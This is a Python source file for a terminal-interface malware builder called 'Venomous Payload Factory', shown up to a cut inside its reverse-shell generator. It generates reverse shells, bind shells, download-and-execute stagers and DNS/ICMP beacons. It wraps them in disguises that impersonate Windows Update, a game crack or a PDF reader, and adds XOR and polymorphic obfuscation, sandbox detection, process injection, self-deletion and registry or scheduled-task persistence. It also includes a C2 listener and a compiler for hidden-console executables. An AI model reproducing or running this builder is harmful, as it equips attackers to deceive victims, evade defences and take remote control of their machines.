"""
Nextral Venomous Payload Factory — payload_factory.py
Stealth Studio V4: Advanced payload generation with customizable templates,
process injection, polymorphic XOR, sandbox evasion, stealth output,
and user-selectable disguise skins.
"""
import base64
import random
import string
import zlib
from textual.app import ComposeResult
from textual.screen import Screen
from textual.containers import Vertical, Horizontal, Container
from textual.widgets import (
    Header, Footer, Static, Button, RichLog, Label,
    Input, Select, Checkbox, TabbedContent, TabPane, Switch
)
from textual.binding import Binding
from textual.reactive import reactive
import pyperclip
import asyncio

# modular generator system
try:
    from generators import get_generator, available_languages
    from generators.c2_listener import C2Listener
    _MODULAR = True
except ImportError:
    _MODULAR = False


# ══════════════════════════════════════════════════════════════════════════════
# PAYLOAD TEMPLATES — Disguise skins for generated payloads
# ══════════════════════════════════════════════════════════════════════════════

PAYLOAD_TEMPLATES = {
    "none": {
        "label": "☠  Raw (No Disguise)",
        "desc": "Pure payload with no wrapper. For advanced operators.",
        "prefix_py": "",
        "prefix_go": "",
        "prefix_cs": "",
    },
    "syscheck": {
        "label": "🔧  System Health Check",
        "desc": "Disguised as a legitimate Windows system diagnostics tool.",
        "prefix_py": (
            '"""\nSystem Health Monitor v2.4.1\n'
            'Performs routine hardware diagnostics and reports anomalies.\n'
            'Licensed under MIT — (c) 2025 DiagnostiCore Inc.\n"""\n'
            'import platform, datetime\n'
            'print(f"[DiagnostiCore] Starting system check on {platform.node()}...")\n'
            'print(f"[DiagnostiCore] Timestamp: {datetime.datetime.now().isoformat()}")\n'
            'print("[DiagnostiCore] Checking CPU thermals... OK")\n'
            'print("[DiagnostiCore] Verifying disk integrity... OK")\n'
            'print("[DiagnostiCore] Running memory diagnostics...")\n\n'
        ),
        "prefix_go": (
            '// SystemHealthCheck v2.4 — DiagnostiCore Inc.\n'
            '// Licensed under MIT. Routine hardware diagnostics.\n'
            'import "fmt"\n'
            'func init() {\n'
            '    fmt.Println("[DiagnostiCore] Starting system check...")\n'
            '    fmt.Println("[DiagnostiCore] Verifying disk integrity... OK")\n'
            '}\n\n'
        ),
        "prefix_cs": (
            '// SystemHealthCheck v2.4 — DiagnostiCore Inc.\n'
            '// Licensed under MIT. Routine hardware diagnostics.\n'
            'Console.WriteLine("[DiagnostiCore] Starting system check...");\n'
            'Console.WriteLine("[DiagnostiCore] Checking CPU thermals... OK");\n\n'
        ),
    },
    "updater": {
        "label": "🔄  Windows Update Agent",
        "desc": "Masquerades as a Windows Update background service.",
        "prefix_py": (
            '"""\nWindows Update Service Agent v10.0.19041\n'
            'Background service for critical security patch deployment.\n'
            '(c) Microsoft Corporation. All rights reserved.\n"""\n'
            'import platform, os, datetime\n'
            'print(f"[WU-Agent] Connecting to update servers...")\n'
            'print(f"[WU-Agent] OS: {platform.system()} {platform.release()}")\n'
            'print(f"[WU-Agent] Checking for critical updates...")\n'
            'print("[WU-Agent] Downloading KB5034441... 100%")\n'
            'print("[WU-Agent] Applying security patch...")\n\n'
        ),
        "prefix_go": (
            '// Windows Update Service Agent v10.0 — Background updater\n'
            'import "fmt"\n'
            'func init() {\n'
            '    fmt.Println("[WU-Agent] Connecting to update servers...")\n'
            '    fmt.Println("[WU-Agent] Checking for critical updates...")\n'
            '}\n\n'
        ),
        "prefix_cs": (
            '// Windows Update Service Agent v10.0\n'
            'Console.WriteLine("[WU-Agent] Connecting to update servers...");\n'
            'Console.WriteLine("[WU-Agent] Checking for critical updates...");\n\n'
        ),
    },
    "game_crack": {
        "label": "🎮  Game License Activator",
        "desc": "Looks like a popular game crack / keygen tool.",
        "prefix_py": (
            '"""\nUniversal Game Activator Pro v5.2\n'
            'Supports 500+ titles. One-click license activation.\n'
            'Coded by xCr4ck-T34m (Discord: kr4ckz#1337)\n"""\n'
            'import time, random\n'
            'titles = ["Elden Ring", "Cyberpunk 2077", "Hogwarts Legacy", "Starfield"]\n'
            'print("=" * 50)\n'
            'print("   UNIVERSAL GAME ACTIVATOR PRO v5.2")\n'
            'print("=" * 50)\n'
            'print(f"Supported titles: {len(titles)}+")\n'
            'print("Generating license key...")\n'
            'time.sleep(1)\n'
            'key = "-".join(["".join(random.choices("ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=5)) for _ in range(4)])\n'
            'print(f"License Key: {key}")\n'
            'print("Activating...")\n\n'
        ),
        "prefix_go": (
            '// Universal Game Activator Pro v5.2\n'
            '// Supports 500+ titles.\n'
            'import "fmt"\n'
            'func init() {\n'
            '    fmt.Println("UNIVERSAL GAME ACTIVATOR PRO v5.2")\n'
            '    fmt.Println("Generating license key...")\n'
            '}\n\n'
        ),
        "prefix_cs": (
            '// Universal Game Activator Pro v5.2\n'
            'Console.WriteLine("UNIVERSAL GAME ACTIVATOR PRO v5.2");\n'
            'Console.WriteLine("Generating license key...");\n\n'
        ),
    },
    "pdf_reader": {
        "label": "📄  PDF Viewer Utility",
        "desc": "Appears as a lightweight PDF rendering utility.",
        "prefix_py": (
            '"""\nLitePDF Reader v3.1.0\n'
            'Lightweight PDF rendering engine for Windows.\n'
            '(c) 2025 LitePDF Project — Open Source (GPLv3)\n"""\n'
            'import os, sys\n'
            'print("[LitePDF] Initializing rendering engine...")\n'
            'print("[LitePDF] Loading font cache... done")\n'
            'print("[LitePDF] Ready to open documents.")\n'
            'if len(sys.argv) < 2:\n'
            '    print("[LitePDF] Usage: litepdf_reader.py <file.pdf>")\n\n'
        ),
        "prefix_go": (
            '// LitePDF Reader v3.1.0 — Lightweight PDF engine\n'
            'import "fmt"\n'
            'func init() {\n'
            '    fmt.Println("[LitePDF] Initializing rendering engine...")\n'
            '}\n\n'
        ),
        "prefix_cs": (
            '// LitePDF Reader v3.1.0\n'
            'Console.WriteLine("[LitePDF] Initializing rendering engine...");\n\n'
        ),
    },
}

TEMPLATE_CHOICES = [(v["label"], k) for k, v in PAYLOAD_TEMPLATES.items()]

# ══════════════════════════════════════════════════════════════════════════════
# PAYLOAD TYPES — What kind of payload to generate
# ══════════════════════════════════════════════════════════════════════════════

PAYLOAD_TYPES = [
    ("🔌  Reverse Shell (TCP)", "reverse_tcp"),
    ("🎧  Bind Shell (Listener)", "bind_shell"),
    ("📡  HTTP Beacon (Staged)", "http_beacon"),
    ("💉  Shellcode Dropper", "shellcode_drop"),
    ("📥  Download & Execute", "download_exec"),
    ("📜  CMD One-Liner", "cmd_one_liner"),
    ("🔗  PowerShell Download-String", "ps_dl_exec"),
    ("🌐  DNS Tunnel Stager", "dns_stager"),
    ("📡  ICMP Beacon", "icmp_beacon"),
]


class PayloadFactoryScreen(Screen):
    """Venomous Payload Factory — Stealth Studio V4"""

    BINDINGS = [
        Binding("escape", "app.pop_screen", "Close"),
        Binding("ctrl+c", "copy_payload", "Copy to Clipboard"),
    ]

    CSS = """
    PayloadFactoryScreen {
        background: #020208;
    }

    #pf_header {
        dock: top;
        height: 5;
        background: #06061a;
        border-bottom: heavy #00b8d4;
        padding: 0 2;
    }
    .pf-title {
        color: #00e5ff;
        text-style: bold;
    }
    .pf-subtitle {
        color: #3a3a5c;
    }

    #pf_main {
        height: 1fr;
        padding: 0 1;
    }
    #pf_left {
        width: 46%;
        padding: 0 1 0 0;
    }
    #pf_right {
        width: 54%;
        padding: 0 0 0 1;
    }

    .pf-label {
        color: #00b8d4;
        text-style: bold;
        margin: 0;
    }
    .pf-sublabel {
        color: #3a3a5c;
        margin: 0 0 1 0;
    }
    .pf-input {
        background: #0a0a1c;
        border: tall #14143a;
        color: #c8c8f0;
        margin: 0 0 1 0;
        min-width: 18;
    }
    .pf-input:focus {
        border: tall #00b8d4;
        background: #0e0e28;
    }

    TabbedContent {
        background: #06061a;
        border: round #14143a;
    }
    TabbedContent ContentSwitcher {
        background: #06061a;
    }
    TabPane {
        padding: 1;
        background: #06061a;
    }
    Tab {
        color: #5a5a7c;
    }
    Tab.-active {
        color: #00e5ff;
        text-style: bold;
    }
    Tab:hover {
        color: #00b8d4;
    }
    Underline {
        color: #00b8d4;
    }

    Checkbox {
        margin: 0;
        color: #8888aa;
        height: auto;
    }
    Checkbox:focus {
        color: #c0c0e0;
    }
    Checkbox.-on {
        color: #00e5ff;
        text-style: bold;
    }

    .legal-checkbox {
        color: #e0365b;
        text-style: bold;
        margin: 1 0 0 0;
    }
    .legal-checkbox.-on {
        color: #00cc66;
    }

    .evasion-info {
        color: #2e2e50;
        margin: 0 0 0 4;
    }

    Select {
        margin: 0 0 1 0;
    }
    SelectCurrent {
        background: #0a0a1c;
        border: tall #14143a;
        color: #c8c8f0;
    }
    SelectCurrent:focus {
        border: tall #00b8d4;
    }
    SelectOverlay {
        background: #0e0e28;
        border: tall #00b8d4;
    }
    OptionList {
        background: #0a0a1c;
        color: #c8c8f0;
    }
    OptionList > .option-list--option-highlighted {
        background: #00b8d4;
        color: #000;
    }

    .switch-row {
        height: auto;
        margin: 0;
    }

    #action_row {
        height: auto;
        margin: 1 0 0 0;
    }
    .action-btn {
        width: 1fr;
        margin: 0 1;
        background: #0a0a20;
        border: tall #1a1a3e;
        color: #6e6e90;
        min-height: 3;
    }
    .action-btn:hover {
        background: #141432;
        color: #c0c0e0;
        border: tall #3a3a6e;
    }
    .action-btn:focus {
        border: tall #00b8d4;
    }
    #gen_btn {
        background: #0a1e2e;
        border: tall #00b8d4;
        color: #00e5ff;
        text-style: bold;
    }
    #gen_btn:hover {
        background: #00b8d4;
        color: #000;
    }
    #copy_btn:hover {
        background: #6c2bd9;
        border: tall #6c2bd9;
        color: #fff;
    }
    #save_btn:hover {
        background: #00a854;
        border: tall #00a854;
        color: #000;
    }
    #listen_start {
        background: #0a2e1e;
        border: tall #00a854;
        color: #00cc66;
        text-style: bold;
    }
    #listen_start:hover {
        background: #00a854;
        color: #000;
    }
    #listen_stop {
        background: #2e0a1e;
        border: tall #e0365b;
        color: #e0365b;
    }
    #listen_stop:hover {
        background: #e0365b;
        color: #000;
    }

    .output-header {
        color: #6c2bd9;
        text-style: bold;
        margin: 0;
    }
    #payload_output {
        height: 1fr;
        background: #030310;
        border: tall #14143a;
        padding: 1;
        color: #00e5ff;
    }
    #payload_output:focus {
        border: tall #00b8d4;
    }

    #listen_log {
        height: 1fr;
        min-height: 8;
        background: #030310;
        border: tall #14143a;
        padding: 1;
        color: #c8c8f0;
        margin: 1 0 0 0;
    }

    #hidden_overlay {
        height: 1fr;
        background: #030310;
        border: tall #14143a;
        padding: 1;
        content-align: center middle;
        display: none;
    }
    .hidden-text {
        color: #00e5ff;
        text-style: bold;
        text-align: center;
    }

    #template_desc {
        color: #4a4a6c;
        height: auto;
        margin: 0 0 1 0;
        padding: 0 1;
    }

    #pf_status {
        dock: bottom;
        height: 1;
        background: #06061a;
        border-top: heavy #14143a;
        color: #3a3a5c;
        padding: 0 2;
    }
    """


    selected_payload = reactive("")
    _hidden_mode = reactive(False)

    LANGUAGES = [
        ("🐍  Python 3", "py"),
        ("🦫  Golang", "go"),
        ("💠  C# (.NET)", "csharp"),
        ("👑  Nim", "nim"),
        ("🦀  Rust", "rust"),
        ("⚡  PowerShell", "ps1"),
        ("🦆  DuckyScript", "ducky"),
        ("📝  One-Liner", "line"),
        ("🌐  DNS Stager", "dns"),
        ("📡  ICMP Beacon", "icmp"),
    ]

    _c2_listener = None

    # ── Compose ──────────────────────────────────────────────────────
    def compose(self) -> ComposeResult:
        yield Header(show_clock=True)

        with Container(id="pf_header"):
            yield Static("☣  VENOMOUS  ─  Stealth Payload Studio v4.0", classes="pf-title")
            yield Static("modular c2 framework  ·  polymorphic encoding  ·  edr evasion  ·  integrated listener", classes="pf-subtitle")

        with Horizontal(id="pf_main"):
            with Vertical(id="pf_left"):
                with TabbedContent():
                    # ── PAYLOAD TYPE tab ──
                    with TabPane("⚡ PAYLOAD"):
                        yield Label("PAYLOAD TYPE:", classes="pf-label")
                        yield Select(PAYLOAD_TYPES, id="payload_type", value="reverse_tcp")
                        with Horizontal():
                            with Vertical():
                                yield Label("LHOST:", classes="pf-label")
                                yield Input(value="127.0.0.1", id="lhost", classes="pf-input")
                            with Vertical():
                                yield Label("LPORT:", classes="pf-label")
                                yield Input(value="4444", id="lport", classes="pf-input")
                        yield Label("LANGUAGE / FRAMEWORK:", classes="pf-label")
                        yield Select(self.LANGUAGES, id="payload_lang", value="py")
                        yield Checkbox("Encrypt C2 Channel (XOR)", id="opt_encrypt", value=False)
                        yield Static("  Encrypts socket communication to evade IDS/IPS", classes="evasion-info")

                    # ── TEMPLATE tab ──
                    with TabPane("🎭 DISGUISE"):
                        yield Label("DISGUISE TEMPLATE:", classes="pf-label")
                        yield Static("Choose how the payload appears to the victim.", classes="pf-sublabel")
                        yield Select(TEMPLATE_CHOICES, id="template_select", value="none")
                        yield Static("", id="template_desc")

                    # ── EVASION tab ──
                    with TabPane("🛡 EVASION"):
                        yield Checkbox("XOR Encode Strings", id="opt_xor", value=True)
                        yield Static("  Obfuscates core logic with single-byte XOR", classes="evasion-info")
                        yield Checkbox("Self-Deletion (Melt)", id="opt_melt", value=False)
                        yield Static("  Attempts to delete binary after initial execution", classes="evasion-info")
                        yield Checkbox("Junk Code Injection", id="opt_junk", value=True)
                        yield Static("  Injects random functions to disrupt signatures", classes="evasion-info")
                        yield Checkbox("Sandbox Detection", id="opt_sandbox", value=False)
                        yield Static("  Checks for VM/debugger before execution", classes="evasion-info")
                        yield Checkbox("Process Injection (APC)", id="opt_inject", value=False)
                        yield Static("  Injects into explorer.exe via QueueUserAPC", classes="evasion-info")
                        yield Checkbox("Polymorphic XOR", id="opt_poly", value=False)
                        yield Static("  Multi-byte key, unique stub per generation", classes="evasion-info")
                        yield Checkbox("Stealth Compression (zlib+b64)", id="opt_stealth_pack", value=False)
                        yield Static("  Compresses & encodes payload in exec() wrapper", classes="evasion-info")

                    # ── ADVANCED tab ──
                    with TabPane("⚙ ADVANCED"):
                        yield Label("CUSTOM SHELLCODE (HEX REQ):", classes="pf-label")
                        yield Input(placeholder="e.g. 909090...", id="custom_shellcode", classes="pf-input")
                        yield Label("ENV KEY (HOSTNAME/USER):", classes="pf-label")
                        yield Input(placeholder="Only run if match found", id="env_key", classes="pf-input")
                        with Horizontal():
                            with Vertical():
                                yield Label("SLEEP (SEC):", classes="pf-label")
                                yield Input(value="0", id="sleep_dur", classes="pf-input")
                            with Vertical():
                                yield Label("JUNK DENSITY:", classes="pf-label")
                                yield Select([("Low", 1), ("Medium", 5), ("High", 20)], id="junk_density", value=5)

                    # ── COMPILER tab ──
                    with TabPane("🛠 COMPILER"):
                        yield Checkbox("Compile Source to Binary (.exe/.elf)", id="opt_compile", value=False)
                        yield Static("  Attempts to run go/nim/mcs locally to forge a raw executable.", classes="evasion-info")
                        yield Label("EXTRA BUILD FLAGS:", classes="pf-label")
                        yield Input(value="-ldflags=\"-H=windowsgui -w -s\"", id="build_flags", classes="pf-input")
                        yield Static("  (Default Go flags to hide console window and strip symbols)", classes="evasion-info")

                    # ── PERSISTENCE tab ──
                    with TabPane("📌 PERSIST"):
                        yield Label("PERSISTENCE MECHANISM:", classes="pf-label")
                        yield Select([
                            ("None", "none"),
                            ("Registry RunKey", "registry"),
                            ("Scheduled Task (Daily)", "schtask"),
                            ("User Startup Folder", "startup")
                        ], id="persist_type", value="none")
                        yield Static("Injects installation logic into the payload stub.", classes="evasion-info")

                    # ── LISTEN tab (c2 handler) ──
                    with TabPane("🎧 LISTEN"):
                        yield Label("C2 LISTENER:", classes="pf-label")
                        yield Static("Spawn a local listener to catch reverse shells from your payloads.", classes="pf-sublabel")
                        with Horizontal():
                            with Vertical():
                                yield Label("BIND ADDR:", classes="pf-label")
                                yield Input(value="0.0.0.0", id="listen_host", classes="pf-input")
                            with Vertical():
                                yield Label("BIND PORT:", classes="pf-label")
                                yield Input(value="4444", id="listen_port", classes="pf-input")
                        yield Label("XOR KEY (0 = none):", classes="pf-label")
                        yield Input(value="0", id="listen_xor", classes="pf-input")
                        with Horizontal():
                            yield Button("▶ START", id="listen_start", classes="action-btn")
                            yield Button("■ STOP", id="listen_stop", classes="action-btn")
                        yield RichLog(id="listen_log", markup=True, highlight=True, max_lines=500)

                yield Checkbox("🛑 I CONFIRM I HAVE LEGAL AUTHORIZATION TO TEST THE TARGET SYSTEM", id="legal_auth", value=False, classes="legal-checkbox")
                yield Static("  Generating or deploying payloads without explicit consent is illegal.", classes="evasion-info")

                # ── Action buttons ──
                with Horizontal(id="action_row"):
                    yield Button("⚡ GENERATE", id="gen_btn", classes="action-btn")
                    yield Button("📋 COPY", id="copy_btn", classes="action-btn")
                    yield Button("💾 SAVE", id="save_btn", classes="action-btn")

            # ── Output panel ──
            with Vertical(id="pf_right"):
                with Horizontal(classes="switch-row"):
                    yield Static("GENERATED PAYLOAD", classes="output-header")
                    yield Checkbox("🔒 Hide Output", id="opt_hide_output", value=False)
                yield RichLog(id="payload_output", markup=True, highlight=True, max_lines=2000)
                yield Static(
                    "[bold #00e5ff]🔒 PAYLOAD SECURED[/]\n\n"
                    "[dim]Output is hidden for operational security.\n"
                    "Use [bold]📋 COPY[/bold] to extract the payload.\n\n"
                    "Byte count shown in the status bar below.[/]",
                    id="hidden_overlay", classes="hidden-text"
                )

        yield Static("ready · select options and hit generate", id="pf_status")
        yield Footer()

    # ── Mount ────────────────────────────────────────────────────────
    def on_mount(self) -> None:
        try:
            from tools_locator import RECOVERED_TOOLS
            if RECOVERED_TOOLS:
                tools_str = ", ".join(RECOVERED_TOOLS)
                self.app.notify(
                    f"Auto-Recovered: {tools_str} (added to session PATH)",
                    severity="information",
                    title="Tool Discovery"
                )
                RECOVERED_TOOLS.clear()
        except ImportError:
            pass

    # ── Reactive watchers ────────────────────────────────────────────
    def on_select_changed(self, event: Select.Changed) -> None:
        if event.select.id == "template_select":
            tpl = PAYLOAD_TEMPLATES.get(event.value, PAYLOAD_TEMPLATES["none"])
            try:
                self.query_one("#template_desc", Static).update(
                    f"[dim italic]{tpl['desc']}[/]"
                )
            except Exception:
                pass

    def on_checkbox_changed(self, event: Checkbox.Changed) -> None:
        if event.checkbox.id == "opt_hide_output":
            self._hidden_mode = event.value
            try:
                output = self.query_one("#payload_output", RichLog)
                overlay = self.query_one("#hidden_overlay", Static)
                output.display = not event.value
                overlay.display = event.value
            except Exception:
                pass

    # ── Buttons ──────────────────────────────────────────────────────
    def on_button_pressed(self, event: Button.Pressed) -> None:
        if event.button.id == "gen_btn":
            if not self.query_one("#legal_auth", Checkbox).value:
                self.app.notify("AUTHORIZATION REQUIRED: You must confirm legal authorization to proceed.", severity="error", timeout=5, title="Safety Interlock")
                return
            self.generate_payload()
        elif event.button.id == "copy_btn":
            self.action_copy_payload()
        elif event.button.id == "save_btn":
            self._save_payload()
        elif event.button.id == "listen_start":
            self._start_listener()
        elif event.button.id == "listen_stop":
            self._stop_listener()

    def _start_listener(self):
        """start the c2 listener in the background"""
        if not _MODULAR:
            self.app.notify("generators package not found", severity="error")
            return
        if self._c2_listener and self._c2_listener.is_running:
            self.app.notify("listener already running", severity="warning")
            return

        host = self.query_one("#listen_host", Input).value.strip()
        port = int(self.query_one("#listen_port", Input).value.strip())
        xor_key = int(self.query_one("#listen_xor", Input).value.strip() or "0")
        log = self.query_one("#listen_log", RichLog)

        listener = C2Listener(host, port, xor_key)

        def on_connect(sid, addr):
            log.write(f"[bold green][+] session {sid} from {addr[0]}:{addr[1]}[/]")

        def on_data(sid, data):
            log.write(f"[cyan][{sid}][/] {data.strip()}")

        def on_disconnect(sid):
            log.write(f"[bold red][-] session {sid} dropped[/]")

        listener.on_connect = on_connect
        listener.on_data = on_data
        listener.on_disconnect = on_disconnect
        self._c2_listener = listener

        async def _run():
            await listener.start()
            log.write(f"[bold #00e5ff]listener started on {host}:{port} (xor key: {xor_key})[/]")
            while listener.is_running:
                await asyncio.sleep(1)

        self.run_worker(_run(), exclusive=False)

    def _stop_listener(self):
        """stop the c2 listener"""
        if self._c2_listener and self._c2_listener.is_running:
            async def _shutdown():
                await self._c2_listener.stop()
            self.run_worker(_shutdown(), exclusive=False)
            log = self.query_one("#listen_log", RichLog)
            log.write("[bold red]listener stopped[/]")
        else:
            self.app.notify("no listener running", severity="warning")

    # ── Save to file ─────────────────────────────────────────────────
    def _save_payload(self) -> None:
        if not self.selected_payload:
            self.app.notify("No payload generated yet", severity="warning")
            return

        import os
        from pathlib import Path

        lang = self.query_one("#payload_lang", Select).value
        ext_map = {"py": ".py", "go": ".go", "csharp": ".cs", "nim": ".nim", "rust": ".rs"}
        ext = ext_map.get(lang, ".txt")

        out_dir = Path.home() / "Desktop"
        if not out_dir.exists():
            out_dir = Path.home()

        fname = f"payload_{self._rstr(6)}{ext}"
        out_path = out_dir / fname

        try:
            with open(out_path, "w", encoding="utf-8") as f:
                f.write(self.selected_payload)
            self.app.notify(f"Saved to {out_path}", severity="information", title="Payload Saved")
            self.query_one("#pf_status", Static).update(f"💾 Saved: {out_path}")
        except Exception as e:
            self.app.notify(f"Save failed: {e}", severity="error")

    # ── core generation ──────────────────────────────────────────────
    def generate_payload(self) -> None:
        lang = self.query_one("#payload_lang", Select).value
        payload_type = self.query_one("#payload_type", Select).value
        lhost = self.query_one("#lhost", Input).value.strip()
        lport = self.query_one("#lport", Input).value.strip()
        opt_xor = self.query_one("#opt_xor", Checkbox).value
        opt_junk = self.query_one("#opt_junk", Checkbox).value
        opt_sandbox = self.query_one("#opt_sandbox", Checkbox).value
        opt_inject = self.query_one("#opt_inject", Checkbox).value
        opt_poly = self.query_one("#opt_poly", Checkbox).value
        opt_stealth = self.query_one("#opt_stealth_pack", Checkbox).value
        opt_encrypt = self.query_one("#opt_encrypt", Checkbox).value
        opt_melt = self.query_one("#opt_melt", Checkbox).value
        persist_type = self.query_one("#persist_type", Select).value

        template_key = self.query_one("#template_select", Select).value

        adv = {
            "shellcode": self.query_one("#custom_shellcode", Input).value.strip(),
            "env_key": self.query_one("#env_key", Input).value.strip(),
            "sleep": int(self.query_one("#sleep_dur", Input).value.strip() or "0"),
            "junk_density": int(self.query_one("#junk_density", Select).value),
            "encrypt": opt_encrypt,
            "melt": opt_melt,
            "persist": persist_type
        }

        status = self.query_one("#pf_status", Static)
        status.update(f"generating {lang} / {payload_type} for {lhost}:{lport}...")

        tpl = PAYLOAD_TEMPLATES.get(template_key, PAYLOAD_TEMPLATES["none"])

        payload_code = ""

        # try the modular generator system first, fall back to legacy inline methods
        if _MODULAR:
            gen = get_generator(lang)
            if gen:
                opts = {
                    "xor": opt_xor, "junk": opt_junk, "sandbox": opt_sandbox,
                    "inject": opt_inject, "poly": opt_poly,
                }
                payload_code = gen.generate(lhost, lport, opts, payload_type, tpl, adv)
                if opt_stealth and lang == "py":
                    payload_code = self._stealth_pack_py(payload_code)
            else:
                payload_code = f"# no generator found for language: {lang}\n"
        else:
            # legacy fallback - use inline methods
            match lang:
                case "py":
                    payload_code = self._gen_python(
                        lhost, lport, opt_xor, opt_junk, opt_sandbox,
                        opt_inject, opt_poly, payload_type, tpl, adv
                    )
                    if opt_stealth:
                        payload_code = self._stealth_pack_py(payload_code)
                case "go":
                    payload_code = self._gen_golang(lhost, lport, opt_xor, opt_junk, opt_sandbox, payload_type, tpl, adv)
                case "csharp":
                    payload_code = self._gen_csharp(lhost, lport, opt_xor, opt_junk, opt_sandbox, opt_inject, payload_type, tpl, adv)
                case "nim":
                    payload_code = self._gen_nim(lhost, lport, opt_xor, opt_junk, opt_sandbox, payload_type, tpl, adv)
                case "rust":
                    payload_code = self._gen_rust(lhost, lport, opt_xor, opt_junk, opt_sandbox, payload_type, tpl, adv)
                case "ps1":
                    payload_code = self._gen_ps1(lhost, lport, opt_xor, opt_junk, opt_sandbox, payload_type, tpl, adv)
                case "ducky":
                    payload_code = self._gen_ducky(lhost, lport, payload_type, adv)
                case "line":
                    payload_code = self._gen_line(lhost, lport, payload_type, adv)

        self.selected_payload = payload_code
        log = self.query_one("#payload_output", RichLog)
        log.clear()
        log.write(payload_code)

        evasion_tags = []
        if opt_xor: evasion_tags.append("xor")
        if opt_junk: evasion_tags.append("junk")
        if opt_sandbox: evasion_tags.append("sandbox")
        if opt_inject: evasion_tags.append("inject")
        if opt_poly: evasion_tags.append("poly")
        if opt_stealth: evasion_tags.append("stealth")
        tag_str = " + ".join(evasion_tags) if evasion_tags else "none"
        tpl_name = tpl["label"].split("  ", 1)[-1] if template_key != "none" else "raw"
        status.update(
            f"✓ {lang} | {payload_type} | disguise: {tpl_name} | "
            f"evasion: {tag_str} | {len(payload_code)} bytes"
        )

        # binary compilation
        opt_compile = self.query_one("#opt_compile", Checkbox).value
        build_flags = self.query_one("#build_flags", Input).value.strip()

        if opt_compile:
            if lang in ["py", "ducky", "line", "ps1", "dns", "icmp"]:
                self.app.notify(f"cannot compile {lang} into a raw executable", severity="warning")
            else:
                self.run_worker(self._compile_worker(lang, payload_code, build_flags), exclusive=True)


    async def _compile_worker(self, lang: str, code: str, flags: str) -> None:
        import os
        import subprocess
        from pathlib import Path

        self.app.call_from_thread(self.app.notify, "Compilation started in background...", title="Forge Active", severity="information")

        out_dir = Path.home() / "Desktop"
        if not out_dir.exists():
            out_dir = Path.home()

        rnd = self._rstr(6)
        src_path = out_dir / f"payload_{rnd}"
        exe_path = out_dir / f"payload_{rnd}.exe"

        ext_map = {"go": ".go", "csharp": ".cs", "nim": ".nim", "rust": ".rs"}
        src_file = src_path.with_suffix(ext_map.get(lang, ".txt"))

        try:
            with open(src_file, "w", encoding="utf-8") as f:
                f.write(code)

            cmd = ""
            if lang == "go":
                cmd = f"go build -o \"{exe_path}\" {flags} \"{src_file}\""
            elif lang == "nim":
                cmd = f"nim c -d:release -d:mingw --app:gui --out:\"{exe_path}\" {flags} \"{src_file}\""
            elif lang == "csharp":
                cmd = f"mcs -out:\"{exe_path}\" {flags} \"{src_file}\""
            elif lang == "rust":
                cmd = f"rustc -o \"{exe_path}\" {flags} \"{src_file}\""

            process = await asyncio.create_subprocess_shell(
                cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                creationflags=subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0
            )
            stdout, stderr = await process.communicate()

            if process.returncode == 0:
                self.app.call_from_thread(self.app.notify, f"Successfully compiled to: {exe_path.name}", title="Forge Complete", severity="information")
            else:
                err_msg = (stderr.decode() or stdout.decode())[:200]
                self.app.call_from_thread(self.app.notify, f"Compilation failed:\n{err_msg}", title="Forge Error", severity="error", timeout=8)

        except Exception as e:
            self.app.call_from_thread(self.app.notify, f"Compiler error: {e}", title="Forge Error", severity="error", timeout=8)

        finally:
            try:
                if src_file.exists():
                    os.remove(src_file)
            except:
                pass

    # ══════════════════════════════════════════════════════════════════
    #  STEALTH PACK — zlib + base64 + exec() wrapper
    # ══════════════════════════════════════════════════════════════════
    def _stealth_pack_py(self, code: str) -> str:
        compressed = zlib.compress(code.encode(), 9)
        encoded = base64.b64encode(compressed).decode()
        # Split into 76-char lines for readability
        lines = [encoded[i:i+76] for i in range(0, len(encoded), 76)]
        joined = '"\n    "'.join(lines)
        return (
            "import base64, zlib\n"
            f"_p = (\n"
            f'    "{joined}"\n'
            f")\n"
            "exec(zlib.decompress(base64.b64decode(_p)))\n"
        )

    # ══════════════════════════════════════════════════════════════════
    #  PYTHON GENERATOR
    # ══════════════════════════════════════════════════════════════════
    def _gen_python(self, host, port, xor, junk, sandbox, inject, poly, ptype, tpl, adv=None):
        adv = adv or {}
        code = ""
        encrypt = adv.get("encrypt", False)
        melt = adv.get("melt", False)

        # Template prefix (disguise)
        prefix = tpl.get("prefix_py", "")
        if prefix:
            code += prefix

        code += "import socket, subprocess, os, time, sys, random\n\n"

        if adv.get("sleep"):
            code += f"time.sleep({adv['sleep']})\n"

        if adv.get("env_key"):
            code += (
                f"if os.environ.get('COMPUTERNAME') != '{adv['env_key']}' and "
                f"os.environ.get('HOSTNAME') != '{adv['env_key']}' and "
                f"os.environ.get('USER') != '{adv['env_key']}': sys.exit(0)\n"
            )

        if adv.get("persist") and adv["persist"] != "none":
            code += self._py_persist_stub(adv["persist"]) + "\n"

        if junk:
            density = adv.get("junk_density", 5)
            for _ in range(density):
                code += self._py_junk() + "\n"

        if sandbox:
            code += base64.b64decode(
                "ZGVmIGNoZWNrX3ZtKCk6CiAgICBpbXBvcnQgY3R5cGVzLCB0aW1lLCB1dWlkCiAgICBzdGFy"
                "dCA9IHRpbWUudGltZSgpCiAgICB0aW1lLnNsZWVwKDAuNSkKICAgIGlmIHRpbWUudGltZSgp"
                "IC0gc3RhcnQgPCAwLjM6IHN5cy5leGl0KDApCiAgICBtYWMgPSAnOicuam9pbihbJ3swOjAy"
                "eH0nLmZvcm1hdCgodXVpZC5nZXRub2RlKCkgPj4gZWxlKSAmIDB4ZmYpIGZvciBlbGUgaW4g"
                "cmFuZ2UoMCw4KjYsOCldWzo6LTFdKQogICAgdm1fbWFjcyA9IFsnMDA6MDU6NjknLCAnMDr6"
                "MGM6MjknLCAnMDA6MWM6MTQnLCAnMDA6NTA6NTYnLCAnMDg6MDA6MjcnXQogICAgZm9yIHYg"
                "aW4gdm1fbWFjczogaWYgbWFjLnN0YXJ0c3dpdGgodik6IHN5cy5leGl0KDApCmNoZWNrX3Zt"
                "KCkK"
            ).decode() + "\n"

        # ── Process Injection mode ──
        if inject:
            inj_code = self._py_injection_stub(host, port)
            if melt:
                inj_code += "\nimport sys; os.remove(sys.argv[0])\n"
            return code + inj_code

        # ── Generate based on payload type ──
        if ptype == "reverse_tcp":
            if encrypt:
                # Custom encrypted stream logic
                key = random.randint(1, 255)
                logic = (
                    f"import socket, subprocess, os, time\n"
                    f"def _x(d, k): return bytes([b ^ k for b in d])\n"
                    f"s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
                    f"while True:\n"
